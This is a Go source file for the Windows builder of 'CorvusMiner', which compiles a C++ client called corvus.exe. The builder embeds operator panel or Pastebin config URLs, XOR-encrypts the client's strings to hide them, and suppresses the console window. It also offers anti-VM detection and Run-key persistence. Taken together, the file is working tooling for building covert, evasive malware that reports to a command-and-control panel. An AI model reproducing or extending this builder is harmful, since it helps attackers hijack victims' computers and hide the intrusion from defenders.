package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

// Windows builder - builds for Windows natively using Visual Studio/MSBuild

// checkWindowsDependencies verifies Visual Studio/CMake and build tools are installed
func checkWindowsDependencies() error {
	logInfo("Checking Windows build dependencies...")

	deps := []string{
		"cmake",
	}

	for _, dep := range deps {
		cmd := exec.Command("where", dep)
		if err := cmd.Run(); err != nil {
			logError("%s not found. Install from: https://cmake.org/download/", dep)
			return err
		}
	}

	// Check for Visual Studio or MSBuild
	if err := checkVisualStudioOrMSBuild(); err != nil {
		return err
	}

	logInfo("All dependencies found")
	return nil
}

// checkVisualStudioOrMSBuild checks for Visual Studio or standalone MSBuild
func checkVisualStudioOrMSBuild() error {
	// Check for MSBuild in Visual Studio locations
	vsLocations := []string{
		"C:\\Program Files\\Microsoft Visual Studio\\2026\\Community\\MSBuild\\Current\\Bin\\MSBuild.exe",
		"C:\\Program Files\\Microsoft Visual Studio\\2026\\Professional\\MSBuild\\Current\\Bin\\MSBuild.exe",
		"C:\\Program Files\\Microsoft Visual Studio\\2026\\Enterprise\\MSBuild\\Current\\Bin\\MSBuild.exe",
		"C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\MSBuild\\Current\\Bin\\MSBuild.exe",
		"C:\\Program Files\\Microsoft Visual Studio\\2022\\Professional\\MSBuild\\Current\\Bin\\MSBuild.exe",
		"C:\\Program Files\\Microsoft Visual Studio\\2022\\Enterprise\\MSBuild\\Current\\Bin\\MSBuild.exe",
		"C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\MSBuild\\Current\\Bin\\MSBuild.exe",
		"C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Professional\\MSBuild\\Current\\Bin\\MSBuild.exe",
		"C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Enterprise\\MSBuild\\Current\\Bin\\MSBuild.exe",
	}

	for _, vsPath := range vsLocations {
		if _, err := os.Stat(vsPath); err == nil {
			logInfo("Found MSBuild at: %s", vsPath)
			return nil
		}
	}

	// Try where command
	cmd := exec.Command("where", "msbuild.exe")
	if output, err := cmd.Output(); err == nil {
		lines := strings.Split(strings.TrimSpace(string(output)), "\r\n")
		if len(lines) > 0 && lines[0] != "" {
			logInfo("Found MSBuild in PATH: %s", lines[0])
			return nil
		}
	}

	return fmt.Errorf("Visual Studio or MSBuild not found. Install Visual Studio Community 2026, 2022, or 2019")
}

// buildClientNonInteractiveWindows builds using command-line flags
func buildClientNonInteractiveWindows() error {
	logInfo("CorvusMiner Builder - Non-Interactive Mode (Windows)")

	// Check dependencies first
	if err := checkWindowsDependencies(); err != nil {
		return fmt.Errorf("dependency check failed: %v", err)
	}

	panelURL := *panelURLFlag
	processMonitoring := *monitoringFlag
	debugConsole := *debugFlag
	antiVM := *antiVMFlag
	persistence := *persistenceFlag

	urlCount := len(strings.Split(panelURL, ","))
	logInfo("Using %d panel URL(s) with fallback support", urlCount)

	logInfo("Configuration:")
	logInfo("  Panel URL: %s", panelURL)
	logInfo("  Process Monitoring: %v", processMonitoring)
	logInfo("  Debug Console: %v", debugConsole)
	logInfo("  Anti-VM Detection: %v", antiVM)
	logInfo("  Persistence: %v", persistence)

	return executeBuildWindows(panelURL, "", false, processMonitoring, debugConsole, antiVM, persistence)
}

// buildClientWindows orchestrates the full build pipeline for Windows
func buildClientWindows() error {
	logInfo("CorvusMiner Builder - Windows Version")

	// Check dependencies first
	if err := checkWindowsDependencies(); err != nil {
		return fmt.Errorf("dependency check failed: %v", err)
	}

	reader := bufio.NewReader(os.Stdin)

	// Get config method preference
	fmt.Print("\n[CONFIG METHOD]\nFetch config from Pastebin/GET endpoint? (y/n) [default: n]: ")
	configMethodInput, _ := reader.ReadString('\n')
	useGetConfig := strings.TrimSpace(configMethodInput) == "y"

	var panelURL string
	var configURL string

	if useGetConfig {
		// Get config URL(s) for direct GET (Pastebin focus)
		fmt.Print("\n[PASTEBIN/GET CONFIG]\nEnter Pastebin raw URL or config endpoint(s) separated by commas for fallback:\n  Example: https://pastebin.com/raw/xXnRDDjH\n \nURL(s): ")
		configURL, _ = reader.ReadString('\n')
		configURL = strings.TrimSpace(configURL)

		if configURL == "" {
			return fmt.Errorf("config URL cannot be empty when using GET method")
		}

		// Validate URLs
		urlCount := len(strings.Split(configURL, ","))
		logInfo("Using %d config URL(s) with fallback support", urlCount)
	} else {
		// Get panel URL(s) for POST method
		fmt.Print("\n[PANEL URL (POST METHOD)]\nEnter panel URL(s) separated by commas for fallback.\nINCLUDE /api/miners/submit at the end of each URL:\n  Example: http://127.0.0.1:8080/api/miners/submit\n  Example: http://panel.example.com:8080/api/miners/submit\n\nURL(s): ")
		panelURL, _ = reader.ReadString('\n')
		panelURL = strings.TrimSpace(panelURL)

		if panelURL == "" {
			return fmt.Errorf("panel URL cannot be empty when using POST method")
		}

		// Warn if user forgot the /api/miners/submit path
		if !strings.Contains(panelURL, "/api/miners/submit") {
			logError("WARNING: URLs do not contain '/api/miners/submit' - this may cause the miner to fail!")
			fmt.Print("Continue anyway? (y/n): ")
			continueInput, _ := reader.ReadString('\n')
			if strings.TrimSpace(continueInput) != "y" {
				return fmt.Errorf("build cancelled by user")
			}
		}

		// Validate URLs
		urlCount := len(strings.Split(panelURL, ","))
		logInfo("Using %d panel URL(s) with fallback support", urlCount)
	}

	// Get monitoring preference
	fmt.Print("\n[OPTIONS]\nEnable process monitoring? (y/n): ")
	monitorInput, _ := reader.ReadString('\n')
	processMonitoring := strings.TrimSpace(monitorInput) == "y"

	// Get debug console preference
	fmt.Print("Enable debug console? (y/n): ")
	debugInput, _ := reader.ReadString('\n')
	debugConsole := strings.TrimSpace(debugInput) == "y"

	// Get anti-VM preference
	fmt.Print("Enable anti-VM detection? (y/n): ")
	antiVMInput, _ := reader.ReadString('\n')
	antiVM := strings.TrimSpace(antiVMInput) == "y"

	// Get persistence preference
	fmt.Print("Enable persistence (Run key)? (y/n): ")
	persistenceInput, _ := reader.ReadString('\n')
	persistence := strings.TrimSpace(persistenceInput) == "y"

	logInfo("\n[BUILD CONFIGURATION]")
	if useGetConfig {
		logInfo("Config Method: GET request from Pastebin/endpoint")
		logInfo("Config URL(s): %s", configURL)
	} else {
		logInfo("Config Method: POST to panel with system info")
		logInfo("Panel URL(s): %s", panelURL)
	}
	logInfo("Process Monitoring: %v", processMonitoring)
	logInfo("Debug Console: %v", debugConsole)
	logInfo("  Anti-VM Detection: %v", antiVM)
	logInfo("  Persistence: %v", persistence)

	return executeBuildWindows(panelURL, configURL, useGetConfig, processMonitoring, debugConsole, antiVM, persistence)
}

// executeBuildWindows performs the actual build process on Windows
func executeBuildWindows(panelURL, configURL string, useGetConfig, processMonitoring, debugConsole, antiVM, persistence bool) error {
	// Clean build directory first to ensure no stale CMake cache or files
	logInfo("Cleaning build directory: %s", buildDir)
	if err := os.RemoveAll(buildDir); err != nil {
		logError("Warning: Failed to remove build directory: %v", err)
	}
	if err := os.MkdirAll(buildDir, 0755); err != nil {
		return fmt.Errorf("failed to create build directory: %v", err)
	}

	// Backup source files
	backupDir := filepath.Join(clientDir, "backup")
	logInfo("Backing up source files to %s", backupDir)
	if err := backupSourceFiles(backupDir); err != nil {
		return fmt.Errorf("backup failed: %v", err)
	}
	defer func() {
		if err := restoreSourceFiles(backupDir); err != nil {
			logError("Failed to restore source files: %v", err)
		}
	}()

	// Generate XOR key
	xorKey := generateXORKey(32)
	logInfo("Generated XOR key (base64): %s", xorKey)

	// Inject encryption key into header
	if err := injectEncryptionKey(xorKey); err != nil {
		return fmt.Errorf("failed to inject encryption key: %v", err)
	}

	// Modify panel URL or config URL BEFORE encryption
	srcFile := filepath.Join(clientDir, "src", "main.cpp")
	if useGetConfig {
		logInfo("Setting config GET URL(s) to: %s", configURL)
		if err := modifyConfigGetURL(srcFile, configURL); err != nil {
			return fmt.Errorf("failed to modify config URL: %v", err)
		}
	} else {
		logInfo("Setting panel URL(s) to: %s", panelURL)
		if err := modifyPanelURL(srcFile, panelURL); err != nil {
			return fmt.Errorf("failed to modify panel URL: %v", err)
		}
	}

	// Decode key for string encryption
	keyBytes, err := base64.StdEncoding.DecodeString(xorKey)
	if err != nil {
		return fmt.Errorf("failed to decode XOR key: %v", err)
	}

	// Encrypt strings in source files (including the modified URLs)
	logInfo("Encrypting strings in source files...")
	if err := encryptSourceStrings(keyBytes); err != nil {
		return fmt.Errorf("string encryption failed: %v", err)
	}

	// DEBUG: Verify the file was actually modified
	debugContent, _ := os.ReadFile(filepath.Join(clientDir, "src", "main.cpp"))
	debugStr := string(debugContent)
	if strings.Contains(debugStr, "DecryptString(__ENCRYPTED_") {
		logInfo("✓ VERIFIED: main.cpp contains DecryptString calls")
	} else {
		logError("✗ WARNING: main.cpp does NOT contain DecryptString calls!")
		logError("First 500 chars: %s", debugStr[:min(500, len(debugStr))])
	}

	// Toggle WIN32 flag for debug console
	if debugConsole {
		logInfo("Enabling debug console...")
	} else {
		logInfo("Disabling debug console (hiding window)...")
	}
	if err := toggleWin32Flag(debugConsole); err != nil {
		return fmt.Errorf("failed to toggle WIN32 flag: %v", err)
	}

	// Run CMake
	logInfo("Configuring project with CMake...")
	if err := runCMakeWindows(configURL, antiVM, persistence, debugConsole); err != nil {
		return fmt.Errorf("CMake configuration failed: %v", err)
	}

	// Run MSBuild
	logInfo("Building project...")
	if err := runMSBuild(); err != nil {
		return fmt.Errorf("build failed: %v", err)
	}

	logSuccess("Build completed successfully!")
	logInfo("Output: %s/corvus.exe", buildDir)

	// If output flag is set, copy binary to specified location
	if *outputFlag != "" {
		srcBinary := filepath.Join(buildDir, "Release", "corvus.exe")
		if _, err := os.Stat(srcBinary); err != nil {
			// Try Debug folder if Release doesn't exist
			srcBinary = filepath.Join(buildDir, "Debug", "corvus.exe")
		}

		dstBinary := filepath.Join(*outputFlag, "corvus.exe")

		// Create output directory if it doesn't exist
		if err := os.MkdirAll(*outputFlag, 0755); err != nil {
			return fmt.Errorf("failed to create output directory: %v", err)
		}

		// Copy binary
		if err := copyFile(srcBinary, dstBinary); err != nil {
			return fmt.Errorf("failed to copy binary to output: %v", err)
		}

		logSuccess("Binary copied to: %s", dstBinary)
	}

	return nil
}

// runCMakeWindows runs CMake for Windows with Visual Studio generator
func runCMakeWindows(configURL string, antiVM bool, persistence bool, debugConsole bool) error {
	// List of generators to try in order
	generators := []string{
		"Visual Studio 17 2022",
		"Visual Studio 16 2019",
	}

	var lastErr error
	for i, generator := range generators {
		args := []string{
			"-G", generator,
			"-A", "x64",
			"-DCMAKE_BUILD_TYPE=Release",
		}

		if antiVM {
			args = append(args, "-DENABLE_ANTIVM=ON")
		}

		if persistence {
			args = append(args, "-DENABLE_PERSISTENCE=ON")
		}

		if debugConsole {
			args = append(args, "-DENABLE_DEBUG_CONSOLE=ON")
		}

		if configURL != "" {
			args = append(args, "-DCONFIG_GET_URL="+configURL)
		}

		args = append(args, "..")

		// Clean CMake cache if not the first attempt
		if i > 0 {
			logInfo("Cleaning CMake cache before trying %s...", generator)
			os.RemoveAll(filepath.Join(buildDir, "CMakeCache.txt"))
			os.RemoveAll(filepath.Join(buildDir, "CMakeFiles"))
		}

		cmd := exec.Command("cmake", args...)
		cmd.Dir = buildDir
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr

		if i == 0 {
			logInfo("Running CMake in %s with %s", buildDir, generator)
		} else {
			logInfo("Trying alternate generator: %s", generator)
		}

		if err := cmd.Run(); err != nil {
			lastErr = err
			continue // Try next generator
		}

		// Success
		return nil
	}

	// All generators failed
	if lastErr != nil {
		return fmt.Errorf("cmake error (tried VS2022 and VS2019): %v", lastErr)
	}
	return fmt.Errorf("cmake error: all generators failed")
}

// runMSBuild runs MSBuild to compile the project
func runMSBuild() error {
	// Try multiple possible solution file names
	possibleSolutions := []string{
		filepath.Join(buildDir, "corvus.sln"),
		filepath.Join(buildDir, "CorvusMiner.sln"),
		filepath.Join(buildDir, "project.sln"),
	}

	var slnFile string
	for _, candidate := range possibleSolutions {
		if _, err := os.Stat(candidate); err == nil {
			slnFile = candidate
			break
		}
	}

	if slnFile == "" {
		// List available files for debugging
		logError("Solution file not found. Checked: %v", possibleSolutions)
		entries, err := os.ReadDir(buildDir)
		if err == nil {
			logError("Files in build directory:")
			for _, entry := range entries {
				if strings.HasSuffix(entry.Name(), ".sln") {
					logError("  - %s", entry.Name())
				}
			}
		}
		return fmt.Errorf("solution file not found in %s", buildDir)
	}

	logInfo("Using solution file: %s", slnFile)

	// Find MSBuild executable
	msbuildPath := findMSBuild()
	if msbuildPath == "" {
		return fmt.Errorf("MSBuild not found in PATH or Visual Studio installation directories")
	}

	logInfo("Using MSBuild: %s", msbuildPath)

	// Run MSBuild with Release configuration
	cmd := exec.Command(msbuildPath, slnFile, "/p:Configuration=Release", "/p:Platform=x64", "/m")
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	logInfo("Running MSBuild...")
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("msbuild error: %v", err)
	}

	return nil
}

// findMSBuild locates the MSBuild executable
func findMSBuild() string {
	// Try standard Visual Studio locations (newest first)
	vsLocations := []string{
		"C:\\Program Files\\Microsoft Visual Studio\\2026\\Community\\MSBuild\\Current\\Bin\\MSBuild.exe",
		"C:\\Program Files\\Microsoft Visual Studio\\2026\\Professional\\MSBuild\\Current\\Bin\\MSBuild.exe",
		"C:\\Program Files\\Microsoft Visual Studio\\2026\\Enterprise\\MSBuild\\Current\\Bin\\MSBuild.exe",
		"C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\MSBuild\\Current\\Bin\\MSBuild.exe",
		"C:\\Program Files\\Microsoft Visual Studio\\2022\\Professional\\MSBuild\\Current\\Bin\\MSBuild.exe",
		"C:\\Program Files\\Microsoft Visual Studio\\2022\\Enterprise\\MSBuild\\Current\\Bin\\MSBuild.exe",
		"C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\MSBuild\\Current\\Bin\\MSBuild.exe",
		"C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Professional\\MSBuild\\Current\\Bin\\MSBuild.exe",
		"C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Enterprise\\MSBuild\\Current\\Bin\\MSBuild.exe",
	}

	for _, path := range vsLocations {
		if _, err := os.Stat(path); err == nil {
			return path
		}
	}

	// Try PATH
	cmd := exec.Command("where", "msbuild.exe")
	if output, err := cmd.Output(); err == nil {
		lines := strings.Split(strings.TrimSpace(string(output)), "\r\n")
		if len(lines) > 0 && lines[0] != "" {
			return lines[0]
		}
	}

	return ""
}

// windowsMain is the main entry point for Windows builds
func windowsMain() {
	if err := buildClientWindows(); err != nil {
		logError("Build failed: %v", err)
		os.Exit(1)
	}
}

// modifyPanelURL modifies the panel URL in main.cpp
func modifyPanelURL(filename, newURL string) error {
	content, err := os.ReadFile(filename)
	if err != nil {
		return fmt.Errorf("failed to read file %s: %w", filename, err)
	}

	contentStr := string(content)

	// Find the ENCRYPT_STR pattern in main.cpp
	// Pattern: ENCRYPT_STR("http://...")
	startMarker := `ENCRYPT_STR("`
	startIdx := strings.Index(contentStr, startMarker)
	if startIdx == -1 {
		logError("Could not find '%s' in %s", startMarker, filename)
		logError("File content preview (first 500 chars): %s", contentStr[:min(500, len(contentStr))])
		return fmt.Errorf("could not find ENCRYPT_STR pattern for panel URL in main.cpp")
	}

	// Find the opening quote
	quoteStart := startIdx + len(startMarker) - 1 // -1 to include the quote

	// Find the closing quote (handle escapes)
	quoteEnd := quoteStart + 1
	for quoteEnd < len(contentStr) {
		if contentStr[quoteEnd] == '\\' {
			quoteEnd += 2 // Skip escaped character
			continue
		}
		if contentStr[quoteEnd] == '"' {
			break
		}
		quoteEnd++
	}

	if quoteEnd >= len(contentStr) {
		return fmt.Errorf("could not find closing quote for panel URL")
	}

	// Replace the old URL with the new one
	before := contentStr[:quoteStart+1] // Include opening quote
	after := contentStr[quoteEnd:]      // Include closing quote onwards
	contentStr = before + newURL + after

	return os.WriteFile(filename, []byte(contentStr), 0644)
}

// modifyConfigGetURL modifies the config GET URL in main.cpp
func modifyConfigGetURL(filename, newURL string) error {
	content, err := os.ReadFile(filename)
	if err != nil {
		return fmt.Errorf("failed to read file %s: %w", filename, err)
	}

	contentStr := string(content)

	// Find: std::string configGetUrlStr = ENCRYPT_STR("");
	searchPattern := `std::string configGetUrlStr = ENCRYPT_STR("`
	startIdx := strings.Index(contentStr, searchPattern)
	if startIdx == -1 {
		logError("Could not find configGetUrlStr pattern in %s", filename)
		return fmt.Errorf("could not find configGetUrlStr ENCRYPT_STR pattern in main.cpp")
	}

	// Find the opening quote (it's right at the end of searchPattern)
	quoteStart := startIdx + len(searchPattern) - 1 // -1 because we want the quote character itself

	// Find the closing quote
	quoteEnd := quoteStart + 1
	for quoteEnd < len(contentStr) {
		if contentStr[quoteEnd] == '\\' {
			quoteEnd += 2 // Skip escaped character
			continue
		}
		if contentStr[quoteEnd] == '"' {
			break
		}
		quoteEnd++
	}

	if quoteEnd >= len(contentStr) {
		return fmt.Errorf("could not find closing quote for config GET URL")
	}

	// Replace the old URL with the new one
	before := contentStr[:quoteStart+1] // Include opening quote
	after := contentStr[quoteEnd:]      // Include closing quote onwards
	contentStr = before + newURL + after

	return os.WriteFile(filename, []byte(contentStr), 0644)
}

// min returns the minimum of two integers
func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// generateXORKey generates a random XOR key and returns it as base64
func generateXORKey(length int) string {
	key := make([]byte, length)
	rand.Read(key)
	return base64.StdEncoding.EncodeToString(key)
}

// injectEncryptionKey injects the XOR key into encryption.h
func injectEncryptionKey(b64Key string) error {
	encryptionHeaderPath := filepath.Join(clientDir, "include", "encryption.h")

	content, err := os.ReadFile(encryptionHeaderPath)
	if err != nil {
		logError("Failed to read encryption.h: %v", err)
		return err
	}

	contentStr := string(content)

	// Replace: const std::string ENCRYPTION_KEY_B64 = "";
	// With:    const std::string ENCRYPTION_KEY_B64 = "BASE64_KEY";
	oldPattern := `const std::string ENCRYPTION_KEY_B64 = "";`
	newPattern := fmt.Sprintf(`const std::string ENCRYPTION_KEY_B64 = "%s";`, b64Key)

	if strings.Contains(contentStr, oldPattern) {
		contentStr = strings.ReplaceAll(contentStr, oldPattern, newPattern)
		logInfo("Injected XOR key into encryption.h")
	} else {
		logError("Could not find ENCRYPTION_KEY_B64 pattern in encryption.h")
		return fmt.Errorf("encryption key pattern not found")
	}

	return os.WriteFile(encryptionHeaderPath, []byte(contentStr), 0644)
}

// encryptSourceStrings finds and encrypts ENCRYPT_STR calls and fills placeholders
func encryptSourceStrings(keyBytes []byte) error {
	const maxPlaceholders = 16
	encryptedValues := []string{}

	srcDir := filepath.Join(clientDir, "src")
	entries, err := os.ReadDir(srcDir)
	if err != nil {
		return err
	}

	for _, entry := range entries {
		if entry.IsDir() {
			continue
		}

		name := entry.Name()
		// Skip encryption.h as it contains decryption logic
		if name == "encryption.h" {
			continue
		}
		if !strings.HasSuffix(name, ".cpp") && !strings.HasSuffix(name, ".h") {
			continue
		}

		filePath := filepath.Join(srcDir, name)
		if err := encryptStringsInFile(filePath, keyBytes, &encryptedValues, maxPlaceholders); err != nil {
			return fmt.Errorf("failed to encrypt %s: %w", filePath, err)
		}
	}

	if err := injectEncryptedPlaceholders(encryptedValues); err != nil {
		return err
	}

	return nil
}

// encryptStringsInFile encrypts ENCRYPT_STR calls in a file and stores the encrypted values
func encryptStringsInFile(filePath string, keyBytes []byte, encryptedValues *[]string, maxPlaceholders int) error {
	content, err := os.ReadFile(filePath)
	if err != nil {
		return err
	}

	contentStr := string(content)
	modified := contentStr
	encryptionCount := 0

	// Find and encrypt all ENCRYPT_STR("...") calls
	// Pattern: ENCRYPT_STR("...") where ... is the string to encrypt

	for {
		// Look for ENCRYPT_STR(
		startIdx := strings.Index(modified, "ENCRYPT_STR(")
		if startIdx == -1 {
			break
		}

		// Find the opening quote after ENCRYPT_STR(
		quoteStart := startIdx + len("ENCRYPT_STR(")

		// Skip any whitespace
		for quoteStart < len(modified) && (modified[quoteStart] == ' ' || modified[quoteStart] == '\t') {
			quoteStart++
		}

		// Must have a quote
		if quoteStart >= len(modified) || modified[quoteStart] != '"' {
			break
		}

		// Find the closing quote (handle escapes)
		quoteEnd := quoteStart + 1
		for quoteEnd < len(modified) {
			if modified[quoteEnd] == '\\' {
				quoteEnd += 2 // Skip escaped character
				continue
			}
			if modified[quoteEnd] == '"' {
				break
			}
			quoteEnd++
		}

		if quoteEnd >= len(modified) {
			break
		}

		// Extract the plaintext string (without quotes)
		plaintext := modified[quoteStart+1 : quoteEnd]

		// Encrypt it
		ciphertext := make([]byte, len(plaintext))
		for i := 0; i < len(plaintext); i++ {
			ciphertext[i] = plaintext[i] ^ keyBytes[i%len(keyBytes)]
		}

		// Encode to base64
		b64Encrypted := base64.StdEncoding.EncodeToString(ciphertext)

		// Append to placeholder list
		*encryptedValues = append(*encryptedValues, b64Encrypted)
		placeholderIdx := len(*encryptedValues) - 1
		if placeholderIdx >= maxPlaceholders {
			return fmt.Errorf("not enough encrypted placeholders (max %d)", maxPlaceholders)
		}

		// Create the replacement: DecryptString(__ENCRYPTED_N__)
		replacement := fmt.Sprintf(`DecryptString(__ENCRYPTED_%d__)`, placeholderIdx)

		// Find the closing parenthesis of ENCRYPT_STR(...)
		closeParenIdx := quoteEnd + 1
		for closeParenIdx < len(modified) && (modified[closeParenIdx] == ' ' || modified[closeParenIdx] == '\t') {
			closeParenIdx++
		}

		if closeParenIdx >= len(modified) || modified[closeParenIdx] != ')' {
			break
		}

		// Replace ENCRYPT_STR("plaintext") with DecryptStringBase64("base64")
		before := modified[:startIdx]
		after := modified[closeParenIdx+1:]
		modified = before + replacement + after

		encryptionCount++

		// Log the encryption
		displayStr := plaintext
		if len(displayStr) > 30 {
			displayStr = displayStr[:30] + "..."
		}
		displayB64 := b64Encrypted
		if len(displayB64) > 40 {
			displayB64 = displayB64[:40] + "..."
		}
		logInfo("✓ Encrypted: %s -> %s", displayStr, displayB64)
	}

	// Only write back if we made changes
	if encryptionCount > 0 {
		logInfo("Encrypted %d strings in %s", encryptionCount, filepath.Base(filePath))
		logInfo("Writing modified file back to: %s", filePath)
		if err := os.WriteFile(filePath, []byte(modified), 0644); err != nil {
			return err
		}
		logInfo("Successfully wrote modified file")
	}

	return nil
}

// injectEncryptedPlaceholders writes the encrypted base64 strings into encryption.h placeholders
func injectEncryptedPlaceholders(values []string) error {
	encryptionHeaderPath := filepath.Join(clientDir, "include", "encryption.h")
	content, err := os.ReadFile(encryptionHeaderPath)
	if err != nil {
		return fmt.Errorf("failed to read encryption.h: %w", err)
	}

	contentStr := string(content)
	for i, val := range values {
		old := fmt.Sprintf(`const char __ENCRYPTED_%d__[] = "";`, i)
		newStr := fmt.Sprintf(`const char __ENCRYPTED_%d__[] = "%s";`, i, val)
		if strings.Contains(contentStr, old) {
			contentStr = strings.ReplaceAll(contentStr, old, newStr)
		} else {
			return fmt.Errorf("placeholder __ENCRYPTED_%d__ not found", i)
		}
	}

	if err := os.WriteFile(encryptionHeaderPath, []byte(contentStr), 0644); err != nil {
		return fmt.Errorf("failed to write encryption.h: %w", err)
	}

	logInfo("Injected %d encrypted strings into encryption.h", len(values))
	return nil
}

// toggleWin32Flag toggles the WIN32 flag in CMakeLists.txt
// When enableDebugConsole is true, we comment out WIN32 and -mwindows to show console
// When enableDebugConsole is false, we uncomment WIN32 and -mwindows to hide console
func toggleWin32Flag(enableDebugConsole bool) error {
	cmakePath := filepath.Join(clientDir, "CMakeLists.txt")
	content, err := os.ReadFile(cmakePath)
	if err != nil {
		return err
	}

	contentStr := string(content)

	// Use regex to handle both cases properly
	if enableDebugConsole {
		// Debug enabled: Comment out WIN32 and -mwindows to show console
		contentStr = strings.ReplaceAll(contentStr, "    WIN32", "    #WIN32")
		contentStr = strings.ReplaceAll(contentStr, "    LINK_FLAGS \"-mwindows\"", "    #LINK_FLAGS \"-mwindows\"")
	} else {
		// Debug disabled: Uncomment WIN32 and -mwindows to hide console
		contentStr = strings.ReplaceAll(contentStr, "    #WIN32", "    WIN32")
		contentStr = strings.ReplaceAll(contentStr, "    #LINK_FLAGS \"-mwindows\"", "    LINK_FLAGS \"-mwindows\"")
	}

	return os.WriteFile(cmakePath, []byte(contentStr), 0644)
}

// backupSourceFiles backs up source files
func backupSourceFiles(backupDirPath string) error {
	os.RemoveAll(backupDirPath)

	srcDir := filepath.Join(clientDir, "src")
	includeDir := filepath.Join(clientDir, "include")

	if err := copyDirRecursive(srcDir, filepath.Join(backupDirPath, "src")); err != nil {
		return err
	}

	if err := copyDirRecursive(includeDir, filepath.Join(backupDirPath, "include")); err != nil {
		return err
	}

	return nil
}

// copyDirRecursive recursively copies a directory
func copyDirRecursive(src, dst string) error {
	srcInfo, err := os.Stat(src)
	if err != nil {
		return err
	}

	if err := os.MkdirAll(dst, srcInfo.Mode()); err != nil {
		return err
	}

	entries, err := os.ReadDir(src)
	if err != nil {
		return err
	}

	for _, entry := range entries {
		srcPath := filepath.Join(src, entry.Name())
		dstPath := filepath.Join(dst, entry.Name())

		if entry.IsDir() {
			if err := copyDirRecursive(srcPath, dstPath); err != nil {
				return err
			}
		} else {
			data, err := os.ReadFile(srcPath)
			if err != nil {
				return err
			}
			if err := os.WriteFile(dstPath, data, 0644); err != nil {
				return err
			}
		}
	}

	return nil
}

// restoreSourceFiles restores files from backup
func restoreSourceFiles(backupDirPath string) error {
	srcDir := filepath.Join(clientDir, "src")
	includeDir := filepath.Join(clientDir, "include")

	if err := restoreDirRecursive(filepath.Join(backupDirPath, "src"), srcDir); err != nil {
		// Ignore if backup doesn't exist
	}

	if err := restoreDirRecursive(filepath.Join(backupDirPath, "include"), includeDir); err != nil {
		// Ignore if backup doesn't exist
	}

	return nil
}

// restoreDirRecursive recursively restores a directory from backup
func restoreDirRecursive(src, dst string) error {
	srcInfo, err := os.Stat(src)
	if err != nil {
		return err
	}

	if err := os.MkdirAll(dst, srcInfo.Mode()); err != nil {
		return err
	}

	entries, err := os.ReadDir(src)
	if err != nil {
		return err
	}

	for _, entry := range entries {
		srcPath := filepath.Join(src, entry.Name())
		dstPath := filepath.Join(dst, entry.Name())

		if entry.IsDir() {
			if err := restoreDirRecursive(srcPath, dstPath); err != nil {
				return err
			}
		} else {
			data, err := os.ReadFile(srcPath)
			if err != nil {
				return err
			}
			if err := os.WriteFile(dstPath, data, 0644); err != nil {
				return err
			}
		}
	}

	return nil
}

// copyFile copies a file from src to dst
func copyFile(src, dst string) error {
	data, err := os.ReadFile(src)
	if err != nil {
		return err
	}
	return os.WriteFile(dst, data, 0644)
}
